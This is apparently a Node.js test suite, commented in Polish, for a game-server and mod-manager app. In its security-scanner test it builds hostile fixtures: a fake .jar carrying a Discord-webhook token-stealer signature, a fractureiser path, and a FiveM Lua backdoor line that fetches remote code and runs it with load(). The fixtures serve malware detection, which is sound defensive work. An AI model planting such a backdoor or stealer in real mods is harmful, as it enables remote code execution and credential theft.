// Testy wersji 1.8.0 (node test/run-tests-10.js)
'use strict';
const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const AdmZip = require('adm-zip');

const root = fs.mkdtempSync(path.join(os.tmpdir(), 'cm-test10-'));
let passed = 0, failed = 0; const queue = [];
const t = (n, f) => queue.push([n, f]);
const w = (p, c = 'x') => { fs.mkdirSync(path.dirname(p), { recursive: true }); fs.writeFileSync(p, c); return p; };
const J = x => JSON.parse(JSON.stringify(x));

t('wirtualny folder: dowiązania, priorytet, wyłączanie, przywracanie plików gry', async () => {
  const { Vfs } = require('../src/main/mods/vfs');
  const v = new Vfs(path.join(root, 'vfs'));
  const game = path.join(root, 'vgame'); const mods = path.join(game, 'Mods');
  w(path.join(game, 'data', 'orig.txt'), 'ORYGINAŁ');
  const a = await v.addFromInstaller('g', 'Mod A', async r => { w(path.join(r.target, 'a', 'a.dll'), 'A'); w(path.join(r.gameRoot, 'data', 'orig.txt'), 'Z MODA A'); w(path.join(r.target, 'wspolny.cfg'), 'A'); });
  const b = await v.addFromInstaller('g', 'Mod B', async r => { w(path.join(r.target, 'wspolny.cfg'), 'B'); });
  const roots = { gameRoot: game, modsDir: mods };
  let r = v.deploy('g', roots);
  assert.strictEqual(r.added, 3, 'trzy unikalne pliki docelowe'); assert.strictEqual(r.total, 3);
  assert.strictEqual(fs.readFileSync(path.join(mods, 'wspolny.cfg'), 'utf8'), 'B', 'późniejszy mod wygrywa');
  assert.strictEqual(fs.readFileSync(path.join(game, 'data', 'orig.txt'), 'utf8'), 'Z MODA A');
  const list = v.list('g'); assert.deepStrictEqual(list.find(m => m.id === a).overwrittenBy, ['Mod B']); assert.deepStrictEqual(list.find(m => m.id === b).overwrites, ['Mod A']);
  v.order('g', [b, a]); v.deploy('g', roots);
  assert.strictEqual(fs.readFileSync(path.join(mods, 'wspolny.cfg'), 'utf8'), 'A', 'po zmianie kolejności');
  v.setMod('g', a, { enabled: false }); r = v.deploy('g', roots);
  assert(!fs.existsSync(path.join(mods, 'a', 'a.dll')), 'wyłączony mod usunięty'); assert(!fs.existsSync(path.join(mods, 'a')), 'pusty folder usunięty');
  assert.strictEqual(fs.readFileSync(path.join(game, 'data', 'orig.txt'), 'utf8'), 'ORYGINAŁ', 'przywrócono plik gry');
  assert.strictEqual(fs.readFileSync(path.join(mods, 'wspolny.cfg'), 'utf8'), 'B');
  assert.deepStrictEqual(v.verify('g'), []);
  // przejęcie istniejącego moda
  w(path.join(mods, 'Stary.dll'), 'S');
  const c = v.adopt('g', path.join(mods, 'Stary.dll'), roots); v.deploy('g', roots);
  assert(fs.existsSync(path.join(mods, 'Stary.dll')) && fs.existsSync(path.join(v.modDir('g', c), '__mods', 'Stary.dll')));
  v.undeploy('g', roots); assert(!fs.existsSync(path.join(mods, 'Stary.dll')) && !fs.existsSync(path.join(mods, 'wspolny.cfg')));
  assert(v.load('g').mods.find(m => m.id === c).enabled, 'undeploy nie zmienia zaznaczeń');
});

t('historia uruchomień: crash po dodaniu moda i moda z logu wskazuje jako podejrzane', async () => {
  const { LaunchHistory } = require('../src/main/mods/history');
  let now = 1_000_000; let mods = [{ key: 'a.jar', name: 'Alfa', version: '1' }, { key: 'b.jar', name: 'Beta', version: '1' }];
  const crashDir = path.join(root, 'crash'); fs.mkdirSync(crashDir);
  const h = new LaunchHistory(path.join(root, 'hist.json'), { mods: async () => mods, crashDirs: () => [{ dir: crashDir, re: /crash/i }], now: () => now });
  await h.start('g'); now += 600000; assert.strictEqual(h.end('g').status, 'ok');
  mods = [...mods, { key: 'c.jar', name: 'Gamma', version: '2' }, { key: 'd.jar', name: 'Delta', version: '1' }]; mods[1] = { ...mods[1], version: '2' };
  await h.start('g'); now += 20000;
  const cf = w(path.join(crashDir, 'crash-2026.txt'), 'Exception in mod Delta: NullPointerException');
  fs.utimesSync(cf, new Date(now), new Date(now));
  const s = h.end('g'); assert.strictEqual(s.status, 'crash'); assert.strictEqual(s.crashFiles.length, 1);
  const an = h.analyze('g');
  assert.strictEqual(an.suspects[0].name, 'Delta', 'wymieniony w logu + dodany');
  assert.deepStrictEqual(J(an.changes.map(c => c.type + ':' + c.name).sort()), ['added:Delta', 'added:Gamma', 'updated:Beta']);
  assert(h.mark('g', s.start, 'ok').manual);
  const h2 = new LaunchHistory(path.join(root, 'hist.json'), { mods: async () => [] }); assert.strictEqual(h2.list('g').length, 2, 'zapis na dysk');
});

t('skaner bezpieczeństwa: stealer w .jar, backdoor FiveM, zaciemnienie, czysty mod', () => {
  const S = require('../src/main/mods/scanner');
  const evil = new AdmZip(); evil.addFile('Main.class', Buffer.from('java/net/URL https://discord.com/api/webhooks/123/abc Local Storage/leveldb java/lang/ProcessBuilder', 'latin1')); evil.writeZip(path.join(root, 'zly.jar'));
  const frac = new AdmZip(); frac.addFile('dev/neko/nekoclient/Client.class', Buffer.from('x')); frac.writeZip(path.join(root, 'frac.jar'));
  const ok = new AdmZip(); ok.addFile('fabric.mod.json', Buffer.from('{"id":"dobry"}')); ok.addFile('pl/Mod.class', Buffer.from('net/minecraft/client')); ok.writeZip(path.join(root, 'dobry.jar'));
  w(path.join(root, 'res', 'server.lua'), 'PerformHttpRequest("https://x.y/p", function(c, body) load(body)() end)');
  w(path.join(root, 'res2', 'obf.lua'), 'local a = "' + '\\x41'.repeat(200) + '"');
  w(path.join(root, 'res3', 'ok.lua'), 'RegisterCommand("hi", function() print("hi") end)');
  const r = S.scanMods([{ name: 'Zły', file: path.join(root, 'zly.jar') }, { name: 'Frac', file: path.join(root, 'frac.jar') }, { name: 'Dobry', file: path.join(root, 'dobry.jar') }, { name: 'Backdoor', file: path.join(root, 'res') }, { name: 'Zaciemniony', file: path.join(root, 'res2') }, { name: 'OK', file: path.join(root, 'res3') }]);
  const by = n => r.results.find(x => x.name === n);
  assert.strictEqual(by('Zły').level, 'danger'); assert(by('Zły').findings.some(f => f.id === 'webhook') && by('Zły').findings.some(f => f.id === 'token'));
  assert(by('Frac').findings.some(f => f.id === 'fractureiser'));
  assert.strictEqual(by('Dobry').level, 'ok'); assert.strictEqual(by('OK').level, 'ok');
  assert.strictEqual(by('Backdoor').level, 'danger'); assert.strictEqual(by('Zaciemniony').level, 'warn');
  assert.strictEqual(r.summary.danger, 3);
  assert(S.toIssues(r).some(i => i.level === 'error' && /Zły/.test(i.title)));
});

t('kopie w chmurze: wykrywanie folderów, kopia, lista, przywracanie', async () => {
  const C = require('../src/main/mods/cloud');
  const od = path.join(root, 'OneDrive'); fs.mkdirSync(od);
  const db = path.join(root, 'Dropbox-x'); fs.mkdirSync(db); w(path.join(root, 'AppData', 'Dropbox', 'info.json'), JSON.stringify({ personal: { path: db } }));
  const prov = C.detectProviders({ env: { OneDrive: od, APPDATA: path.join(root, 'AppData') }, custom: path.join(root, 'nie-ma') });
  assert.deepStrictEqual(prov.map(p => p.id).slice(0, 2), ['onedrive', 'dropbox']);
  const tar = (args) => new Promise((res, rej) => require('child_process').execFile('tar', args, e => (e ? rej(e) : res())));
  const cb = new C.CloudBackup({ runTar: tar });
  const saves = path.join(root, 'saves'); w(path.join(saves, 'slot1.sav'), 'ZAPIS');
  const b = await cb.backup({ path: od }, 'skyrimse', { saves: [saves], profileCode: 'CM1:abc' }, { label: 'test' });
  assert(fs.existsSync(path.join(b.dir, 'saves-0.tar.gz')) && fs.existsSync(path.join(b.dir, 'profil-modow.txt')));
  const list = cb.list({ path: od }, 'skyrimse'); assert.strictEqual(list.length, 1); assert(list[0].own);
  fs.writeFileSync(path.join(saves, 'slot1.sav'), 'ZEPSUTY');
  let safety = 0; const res = await cb.restore(list[0], { saves: [saves], safety: async () => { safety++; } });
  assert.strictEqual(fs.readFileSync(path.join(saves, 'slot1.sav'), 'utf8'), 'ZAPIS'); assert.strictEqual(res.profileCode, 'CM1:abc'); assert.strictEqual(safety, 1);
});

t('panel webowy: PIN, token, lista serwerów, polecenia, blokada po błędach', async () => {
  const { WebPanel } = require('../src/main/webpanel');
  const sent = []; const settings = { webPanelPin: '123456' };
  const servers = { list: () => [{ id: 's1', name: 'MC', typeName: 'Minecraft', status: 'running', port: 25565 }], get: id => { if (id !== 's1') throw new Error('Nie znaleziono serwera'); return {}; }, getLog: () => ['linia 1', 'linia 2'], start() {}, stop() { sent.push('stop'); }, kill() {}, restart: async () => {}, command: (id, c) => sent.push(c), log() {} };
  const p = new WebPanel({ servers, monitor: { st: () => ({ history: [{ cpu: 5, mem: 1e9 }], players: new Set(['Ala']) }), count: () => 1 }, getSettings: () => settings, saveSettings() {} });
  const st = await p.start(0 + 18790 + Math.floor(Math.random() * 1000));
  const base = `http://127.0.0.1:${st.port}`;
  try {
    assert((await (await fetch(base + '/')).text()).includes('CodeManager'));
    assert.strictEqual((await fetch(base + '/api/servers')).status, 401);
    assert.strictEqual((await fetch(base + '/api/login', { method: 'POST', body: JSON.stringify({ pin: '000000' }) })).status, 401);
    const lr = await fetch(base + '/api/login', { method: 'POST', body: JSON.stringify({ pin: '123456' }) }); const { token } = await lr.json();
    const H = { Authorization: 'Bearer ' + token, 'Content-Type': 'application/json' };
    const list = await (await fetch(base + '/api/servers', { headers: H })).json(); assert.strictEqual(list[0].players, 1); assert.deepStrictEqual(list[0].playerList, ['Ala']);
    assert.strictEqual((await (await fetch(base + '/api/servers/s1/console', { headers: H })).json()).lines.length, 2);
    await fetch(base + '/api/servers/s1/command', { method: 'POST', headers: H, body: JSON.stringify({ cmd: 'say hej' }) }); assert.deepStrictEqual(sent, ['say hej']);
    assert.strictEqual((await fetch(base + '/api/servers/zly/stop', { method: 'POST', headers: H })).status, 500);
    for (let i = 0; i < 5; i++) await fetch(base + '/api/login', { method: 'POST', body: JSON.stringify({ pin: '1' }) });
    assert.strictEqual((await fetch(base + '/api/login', { method: 'POST', body: JSON.stringify({ pin: '123456' }) })).status, 429, 'blokada po 5 błędnych próbach');
  } finally { p.stop(); }
});

t('Docker: polecenie uruchomienia z limitami, portami i ścieżkami w kontenerze', () => {
  const D = require('../src/main/servers/docker');
  const s = { id: 'abc', type: 'minecraft', path: path.join(root, 'srv'), docker: { enabled: true, memory: 4096, cpus: 2 } };
  const r = D.buildRun(s, { cmd: 'C:\\Program Files\\Java\\bin\\java.exe', args: ['-Xmx3G', '-jar', 'server.jar', 'nogui'], cwd: s.path }, [{ port: 25565, proto: 'TCP' }]);
  assert.strictEqual(r.cmd, 'docker');
  const a = r.args.join(' ');
  assert(a.includes('--name cm-abc') && a.includes('-p 25565:25565/tcp') && a.includes('--memory 4096m') && a.includes('--cpus 2') && a.includes(`${s.path}:/data`));
  assert(a.endsWith('eclipse-temurin:21-jre java -Xmx3G -jar server.jar nogui'));
  const r2 = D.buildRun({ ...s, type: 'valheim', docker: { enabled: true, image: 'moj/obraz' } }, { cmd: path.join(s.path, 'valheim_server.x86_64'), args: ['-port', '2456'], cwd: s.path }, []);
  assert(r2.args.join(' ').endsWith('moj/obraz /data/valheim_server.x86_64 -port 2456'));
  assert.throws(() => D.buildRun({ ...s, type: 'valheim', docker: { enabled: true } }, { cmd: '/x', args: [] }, []), /obraz/);
});

t('boty Discord: szablony, komendy /, uprawnienia, warunki, akcje serwerów, zdarzenia gry', async () => {
  const { Bot, render } = require('../src/main/bots/runner');
  assert.strictEqual(render('Cześć {user.name}, wynik {option:liczba}, {var:x}', { user: { id: '1', username: 'ala' }, options: { liczba: 5 }, vars: { x: 7 } }), 'Cześć ala, wynik 5, 7');
  assert(/^[1-6]$/.test(render('{random:1-6}', {})));
  const calls = [];
  class FakeClient { constructor(o) { this.o = o; this.appId = 'app1'; this.h = {}; } on(e, f) { this.h[e] = f; } connect() { this.h.READY({ user: { username: 'bot' } }); } close() {} async rest(m, r, b) { calls.push([m, r, b]); if (r === '/users/@me/channels') return { id: 'dm1' }; return {}; } }
  const cmEvents = [];
  const def = { id: 'b', name: 'B', guildId: 'g1', prefix: '!', vars: {}, commands: [
    { name: 'status', type: 'slash', description: 'Status', actions: [{ type: 'cmStatus' }] },
    { name: 'start', type: 'slash', permission: 'admin', options: [{ name: 'serwer', type: 'string' }], actions: [{ type: 'cmServer', serverId: 's1', action: 'start' }] },
    { name: 'kostka', type: 'prefix', actions: [{ type: 'incVar', name: 'rzuty' }, { type: 'condition', op: '>', left: '{var:rzuty}', right: '1', then: [{ type: 'reply', text: 'Rzut nr {var:rzuty}' }], else: [{ type: 'reply', text: 'Pierwszy rzut' }] }] },
  ], events: [{ event: 'cm:playerJoin', actions: [{ type: 'send', channelId: 'c9', text: '{game.player} wszedł na {game.server}' }] }, { event: 'memberJoin', actions: [{ type: 'dm', text: 'Witaj {user.name}!' }] }] };
  const bot = new Bot(def, { log: () => {}, cm: { status: async () => [{ name: 'MC', type: 'Minecraft', status: 'running', players: 3 }], server: async (id, a) => { cmEvents.push(id + ':' + a); return 'OK ' + a; } } });
  await bot.start('TOKEN', FakeClient);
  await new Promise(r => setTimeout(r, 20));
  const reg = calls.find(c => c[1] === '/applications/app1/guilds/g1/commands'); assert(reg, 'rejestracja komend na serwerze');
  assert.deepStrictEqual(reg[2].map(c => c.name), ['status', 'start']); assert.strictEqual(reg[2][1].default_member_permissions, String(1n << 5n));
  assert(bot.intents() & (1 << 15), 'komendy z prefiksem wymagają Message Content');
  calls.length = 0;
  await bot.onInteraction({ type: 2, id: 'i1', token: 'tk', guild_id: 'g1', channel_id: 'c1', member: { user: { id: 'u1', username: 'ala' }, roles: [], permissions: '0' }, data: { name: 'start', options: [] } });
  assert(/Nie masz uprawnień/.test(calls[0][2].data.content), 'brak uprawnień'); assert.deepStrictEqual(cmEvents, []);
  calls.length = 0;
  await bot.onInteraction({ type: 2, id: 'i2', token: 'tk', guild_id: 'g1', channel_id: 'c1', member: { user: { id: 'u1', username: 'ala' }, roles: [], permissions: String(1n << 3n) }, data: { name: 'start', options: [] } });
  assert.deepStrictEqual(cmEvents, ['s1:start']); assert.strictEqual(calls[0][2].data.content, 'OK start');
  calls.length = 0;
  await bot.onInteraction({ type: 2, id: 'i3', token: 'tk', guild_id: 'g1', member: { user: { id: 'u1', username: 'ala' }, roles: [], permissions: '0' }, data: { name: 'status' } });
  assert(/🟢 MC/.test(calls[0][2].data.embeds[0].fields[0].name));
  calls.length = 0;
  const msg = id => ({ id, guild_id: 'g1', channel_id: 'c1', author: { id: 'u2', username: 'ola' }, member: { roles: [] }, content: '!kostka' });
  await bot.onMessage(msg('m1')); await bot.onMessage(msg('m2'));
  assert.deepStrictEqual(calls.map(c => c[2].content), ['Pierwszy rzut', 'Rzut nr 2']); assert.strictEqual(def.vars.rzuty, 2);
  calls.length = 0;
  await bot.trigger('cm:playerJoin', { server: { id: 's1', name: 'MC' }, player: 'Steve', count: 1 });
  assert.deepStrictEqual(calls[0], ['POST', '/channels/c9/messages', { content: 'Steve wszedł na MC' }]);
  calls.length = 0;
  await bot.trigger('memberJoin', { guildId: 'g1', user: { id: 'u5', username: 'nowy' } });
  assert.deepStrictEqual(calls.map(c => c[1]), ['/users/@me/channels', '/channels/dm1/messages']);
  // eksport do discord.js
  const files = require('../src/main/bots/export').build(def);
  assert(files['index.js'].includes("case \"status\"") && files['index.js'].includes("case \"kostka\"") && files['package.json'].includes('discord.js'));
  new Function('require', 'process', '__dirname', files['index.js'].replace(/client\.login\(.*\);/, '')); // poprawna składnia
});

t('LSP: ramkowanie JSON-RPC, odpowiedzi i żądania serwera, pliki ---@meta z bazy gry', async () => {
  const { RpcConnection, stubsFromDb, applyTextEdits } = require('../src/main/editor/lsp');
  const { EventEmitter } = require('events');
  const out = []; const proc = { stdout: new EventEmitter(), stderr: new EventEmitter(), stdin: { write: s => out.push(s) } };
  const notes = [];
  const c = new RpcConnection(proc, { onNotify: (m, p) => notes.push([m, p]), onRequest: m => (m === 'workspace/configuration' ? [{ a: 1 }] : null) });
  const frame = o => { const s = JSON.stringify(o); return Buffer.from(`Content-Length: ${Buffer.byteLength(s)}\r\n\r\n${s}`); };
  const pr = c.request('initialize', {});
  const f = Buffer.concat([frame({ jsonrpc: '2.0', id: 1, result: { capabilities: { hoverProvider: true } } }), frame({ jsonrpc: '2.0', method: 'textDocument/publishDiagnostics', params: { uri: 'file:///a', diagnostics: [{ message: 'błąd' }] } })]);
  proc.stdout.emit('data', f.slice(0, 10)); proc.stdout.emit('data', f.slice(10));
  assert.deepStrictEqual(J(await pr), { capabilities: { hoverProvider: true } });
  assert.strictEqual(notes[0][1].diagnostics[0].message, 'błąd');
  proc.stdout.emit('data', frame({ jsonrpc: '2.0', id: 7, method: 'workspace/configuration', params: { items: [{}] } }));
  await new Promise(r => setTimeout(r, 10));
  assert(/"id":7,"result":\[\{"a":1\}\]/.test(out[out.length - 1]));
  const stub = stubsFromDb({ id: 'fivem', name: 'FiveM', globals: { GetEntityCoords: ['f', '(entity: number, alive: boolean): number[]', 'number[]', 'Pozycja encji', 'sh', 0] }, tables: { Citizen: { Wait: ['f', '(ms: number)', '', 'Czeka', '', 0] } }, classes: { Player: { b: 'Entity', m: { Nick: ['f', '(): string', 'string', '', '', 0], health: ['v', '', 'number', '', '', 0] } } }, vars: {} });
  assert(stub.includes('---@param alive? boolean') && stub.includes('function GetEntityCoords(entity, alive) end') && stub.includes('function Citizen.Wait(ms) end') && stub.includes('---@class Player : Entity') && stub.includes('---@field health number') && stub.includes('function Player:Nick() end'));
  assert.strictEqual(applyTextEdits('local a = 1\nprint(a)\n', [{ range: { start: { line: 0, character: 6 }, end: { line: 0, character: 7 } }, newText: 'x' }, { range: { start: { line: 1, character: 6 }, end: { line: 1, character: 7 } }, newText: 'x' }]), 'local x = 1\nprint(x)\n');
});

t('Git: status, commit, zawartość z HEAD, historia', async () => {
  const G = require('../src/main/editor/git');
  if (!(await G.available()).ok) return;
  const d = path.join(root, 'repo'); fs.mkdirSync(d); await G.init(d);
  w(path.join(d, 'a.lua'), 'print(1)');
  let s = await G.status(d); assert.strictEqual(s.repo, true); assert(s.files[0].untracked);
  await G.stageAll(s.root); await G.commit(s.root, 'Pierwszy', { author: { name: 'Test', email: 't@t.pl' } });
  w(path.join(d, 'a.lua'), 'print(2)'); s = await G.status(d);
  assert.strictEqual(s.files[0].work, 'M'); assert.strictEqual(await G.headContent(s.root, path.join(d, 'a.lua')), 'print(1)');
  assert.strictEqual((await G.log(s.root))[0].subject, 'Pierwszy');
  await assert.rejects(G.commit(s.root, '  '), /opis zmian/);
  assert.deepStrictEqual(J(G.parseStatus('## main...origin/main [ahead 2, behind 1]\0 M x.txt\0R  b.txt\0a.txt\0')), { branch: 'main', upstream: 'origin/main', ahead: 2, behind: 1, files: [{ path: 'x.txt', orig: null, index: ' ', work: 'M', staged: false, untracked: false, conflict: false }, { path: 'b.txt', orig: 'a.txt', index: 'R', work: ' ', staged: true, untracked: false, conflict: false }] });
});

t('optymalizator: pamięć dla Minecrafta, mody wydajnościowe, plan zasilania, zapis do launcherów', () => {
  const O = require('../src/main/optimizer');
  assert.strictEqual(O.recommendedRam(0, 16), 2); assert.strictEqual(O.recommendedRam(120, 16), 6); assert.strictEqual(O.recommendedRam(400, 8), 4);
  const prism = path.join(root, 'prism', 'inst'); w(path.join(prism, 'instance.cfg'), 'name=Test\nOverrideMemory=true\nMaxMemAlloc=2048\n'); fs.mkdirSync(path.join(prism, '.minecraft'));
  const inst = { id: 'prism-inst', launcher: 'Prism Launcher', path: path.join(prism, '.minecraft'), loader: 'fabric', mcVersion: '1.21.1' };
  const mods = Array.from({ length: 80 }, (_, i) => ({ id: 'mod' + i, enabled: true })).concat([{ id: 'sodium', enabled: true }]);
  const sug = O.suggest({ hw: { ramGB: 16, freeGB: 8, powerPlan: { name: 'Zrównoważony' }, gameMode: true }, game: { id: 'minecraft' }, report: { mods }, instance: inst });
  const ram = sug.find(s => s.action && s.action.type === 'mcram'); assert(ram && ram.action.mb === 6144, 'za mało RAM → 6 GB');
  assert(sug.some(s => s.action && s.action.type === 'powerplan'));
  assert(!sug.some(s => s.action && s.action.id === 'sodium') && sug.some(s => s.action && s.action.id === 'lithium'));
  O.setMcMemory(inst, 6144); assert(/MaxMemAlloc=6144/.test(fs.readFileSync(path.join(prism, 'instance.cfg'), 'utf8')));
  const dot = path.join(root, '.minecraft'); w(path.join(dot, 'launcher_profiles.json'), JSON.stringify({ profiles: { a: { name: 'Fabric', lastVersionId: 'fabric', javaArgs: '-Xmx2G -XX:+UseG1GC' } } }));
  const mi = { id: 'mc-default', launcher: 'Minecraft Launcher', path: dot };
  assert.strictEqual(O.mcMemory(mi).max, 2048); O.setMcMemory(mi, 4096);
  assert.strictEqual(JSON.parse(fs.readFileSync(path.join(dot, 'launcher_profiles.json'))).profiles.a.javaArgs, '-Xmx4096M -XX:+UseG1GC');
  assert(O.suggest({ hw: { ramGB: 32 }, game: { id: 'x' }, report: null })[0].level === 'ok');
});

t('zaproszenia: link, kod, łączenie z serwerem, lista serwerów Minecrafta (NBT)', () => {
  const I = require('../src/main/invite');
  const { link, code } = I.build({ gameId: 'minecraft', serverName: 'Serwer Ali', address: '1.2.3.4:25565', profileCode: 'CM1:xyz', message: 'Wbijaj!' });
  assert(link.startsWith('codemanager://join/') && code.startsWith('CMJ1:'));
  const p = I.parse(link); assert.strictEqual(p.address, '1.2.3.4:25565'); assert.strictEqual(p.profileCode, 'CM1:xyz'); assert.deepStrictEqual(J(I.parse(code)), J(p));
  assert.throws(() => I.parse('https://example.com'), /nie jest zaproszenie/);
  assert.strictEqual(I.connectFor('fivem', '1.2.3.4:30120').url, 'fivem://connect/1.2.3.4:30120');
  assert.strictEqual(I.connectFor('garrysmod', '1.2.3.4:27015').url, 'steam://connect/1.2.3.4:27015');
  assert(I.connectFor('minecraft', 'x').serversDat);
  const gd = path.join(root, 'mcinst'); fs.mkdirSync(gd);
  assert.strictEqual(I.addMinecraftServer(gd, 'Serwer Ali', '1.2.3.4'), true);
  assert.strictEqual(I.addMinecraftServer(gd, 'Inny', '5.6.7.8'), true);
  assert.strictEqual(I.addMinecraftServer(gd, 'Duplikat', '1.2.3.4'), false);
  assert.deepStrictEqual(J(I.minecraftServers(gd)), [{ ip: '5.6.7.8', name: 'Inny' }, { ip: '1.2.3.4', name: 'Serwer Ali' }]);
});

t('wtyczki: gry z plugin.json, własne sprawdzanie, polecenia, reguły analizatora', async () => {
  const P = require('../src/main/plugins'); P._reset();
  const dir = path.join(root, 'plugins'); fs.mkdirSync(dir);
  P.createExample(dir);
  const GAMES = []; const TYPES = {}; const rules = [];
  const { Report } = require('../src/main/compat/common');
  P.loadAll({ dir, enabledMap: {}, GAMES, TYPES, analyzer: { addRule: (...a) => rules.push(a) }, Report, settingsFor: () => ({}) });
  assert.strictEqual(GAMES.length, 0, 'wyłączona wtyczka nic nie dodaje');
  const toasts = [];
  P.loadAll({ dir, enabledMap: { przyklad: true }, GAMES, TYPES, analyzer: { addRule: (...a) => rules.push(a) }, Report, emit: (ch, d) => toasts.push(d), settingsFor: () => ({}) });
  const g = GAMES.find(x => x.id === 'terraria-vanilla'); assert(g && g.checker === 'plugin:terraria-vanilla' && g.appIds[0] === 105600);
  const gp = path.join(root, 'terr'); fs.mkdirSync(path.join(gp, 'Content'), { recursive: true });
  const rep = P.checker(g.checker)({ gamePath: gp }); assert(rep.issues.some(i => i.level === 'ok'));
  assert.strictEqual(rules.length, 1);
  assert.strictEqual(await P.runCommand('przyklad', 'hello'), 'OK'); assert(/Cześć/.test(toasts[0].msg));
  assert.deepStrictEqual(P.list(dir, { przyklad: true })[0].games, ['Terraria (bez tModLoadera)']);
  assert.strictEqual(P.declaredGames(dir, { przyklad: true })[0].id, 'terraria-vanilla');
});

t('edytor bloczkowy: sprawdzanie połączeń i błędów, generowanie Lua/Python/JS', () => {
  const B = require('../src/renderer/js/blocks-core.js');
  // przykłady są poprawne
  for (const [k, e] of Object.entries(B.EXAMPLES)) { const g = e.make(); assert.deepStrictEqual(B.validate(g).filter(i => i.level === 'error'), [], k); }
  const g = B.empty('lua', 'fivem');
  const cmd = B.addNode(g, 'fivem.command', 0, 0, { name: 'heal' }); const chat = B.addNode(g, 'fivem.chat', 300, 0); const num = B.addNode(g, 'lit.number', 0, 200, { v: 5 }); const txt = B.addNode(g, 'text.len', 0, 300);
  assert.strictEqual(B.canConnect(g, { node: cmd.id, pin: 'then' }, { node: chat.id, pin: 'text' }).ok, false, 'przepływ do danych');
  assert(/Typy się nie zgadzają/.test(B.canConnect(g, { node: cmd.id, pin: 'args' }, { node: chat.id, pin: 'text' }).reason));
  assert.strictEqual(B.canConnect(g, { node: num.id, pin: 'out' }, { node: chat.id, pin: 'text' }).convert, true, 'liczba → tekst z konwersją');
  assert.strictEqual(B.canConnect(g, { node: txt.id, pin: 'out' }, { node: txt.id, pin: 'a' }).ok, false, 'sam ze sobą');
  B.connect(g, { node: cmd.id, pin: 'then' }, { node: chat.id, pin: 'exec' });
  B.connect(g, { node: num.id, pin: 'out' }, { node: chat.id, pin: 'text' });
  let code = B.generate(g).code; assert(code.includes('RegisterCommand("heal"') && code.includes('tostring(5)'), code);
  // błędy: pusty gracz w bloczku, bloczek z innej gry, niepołączona akcja, strona klienta
  const kick = B.addNode(g, 'fivem.kick', 600, 0); const gm = B.addNode(g, 'gmod.print', 600, 200); const notif = B.addNode(g, 'fivem.notify', 600, 300);
  const v = B.validate(g);
  assert(v.some(i => i.node === kick.id && /nigdy się nie wykona/.test(i.msg)));
  assert(v.some(i => i.node === kick.id && i.level === 'error' && /gracza/.test(i.msg)));
  assert(v.some(i => i.node === gm.id && /nie działa w wybranym/.test(i.msg)));
  assert(v.some(i => i.node === notif.id && /po stronie klienta/.test(i.msg)));
  assert(v.some(i => i.node === txt.id && i.level === 'warn' && /nie jest nigdzie użyty/.test(i.msg)));
  assert(B.generate(g).code.includes('UWAGA: schemat ma błędy'));
  // dwa wyjścia przepływu z jednego pinu są zastępowane, cykl przepływu wykrywany
  const g2 = B.empty('python'); const s = B.addNode(g2, 'ev.start', 0, 0); const p1 = B.addNode(g2, 'act.print', 0, 0); const p2 = B.addNode(g2, 'act.print', 0, 0);
  B.connect(g2, { node: s.id, pin: 'then' }, { node: p1.id, pin: 'exec' }); B.connect(g2, { node: s.id, pin: 'then' }, { node: p2.id, pin: 'exec' });
  assert.strictEqual(g2.links.filter(l => l.from.node === s.id).length, 1);
  B.connect(g2, { node: p2.id, pin: 'then' }, { node: p1.id, pin: 'exec' }); B.connect(g2, { node: p1.id, pin: 'then' }, { node: p2.id, pin: 'exec' });
  assert(B.validate(g2).some(i => /wraca do tego samego/.test(i.msg)));
  // zmienne i warunek w Pythonie dają działający kod
  const g3 = B.empty('python'); const st = B.addNode(g3, 'ev.start', 0, 0); const set = B.addNode(g3, 'var.set', 0, 0, { name: 'punkty', value: 7 }); const iff = B.addNode(g3, 'flow.if', 0, 0); const gt = B.addNode(g3, 'cmp.gt', 0, 0, { b: 5 }); const get = B.addNode(g3, 'var.get', 0, 0, { name: 'punkty' }); const yes = B.addNode(g3, 'act.print', 0, 0, { value: 'dużo' }); const no = B.addNode(g3, 'act.print', 0, 0, { value: 'mało' });
  B.connect(g3, { node: st.id, pin: 'then' }, { node: set.id, pin: 'exec' }); B.connect(g3, { node: set.id, pin: 'then' }, { node: iff.id, pin: 'exec' }); B.connect(g3, { node: get.id, pin: 'value' }, { node: gt.id, pin: 'a' }); B.connect(g3, { node: gt.id, pin: 'out' }, { node: iff.id, pin: 'cond' }); B.connect(g3, { node: iff.id, pin: 'then' }, { node: yes.id, pin: 'exec' }); B.connect(g3, { node: iff.id, pin: 'else' }, { node: no.id, pin: 'exec' });
  assert.deepStrictEqual(B.validate(g3).filter(i => i.level === 'error'), []);
  const py = B.generate(g3).code; fs.writeFileSync(path.join(root, 'b.py'), py);
  const res = require('child_process').spawnSync('python3', [path.join(root, 'b.py')], { encoding: 'utf8' });
  if (!res.error) assert.strictEqual(res.stdout.trim(), 'dużo', py + res.stderr);
  g3.target = 'js'; const js = B.generate(g3).code; fs.writeFileSync(path.join(root, 'b.js'), js);
  assert.strictEqual(require('child_process').spawnSync(process.execPath, [path.join(root, 'b.js')], { encoding: 'utf8' }).stdout.trim(), 'dużo', js);
  g3.target = 'lua'; g3.profile = 'lua'; const lua = B.generate(g3).code; assert(lua.includes('local punkty = 0') && lua.includes('if (punkty > 5) then'), lua);
});

(async () => {
  for (const [n, f] of queue) { try { await f(); passed++; console.log('  ✔ ' + n); } catch (e) { failed++; console.log('  ✖ ' + n + '\n    ' + String(e.stack).split('\n').slice(0, 5).join('\n    ')); } }
  fs.rmSync(root, { recursive: true, force: true });
  console.log(`\n${passed} OK, ${failed} błędów`);
  process.exit(failed ? 1 : 0);
})();
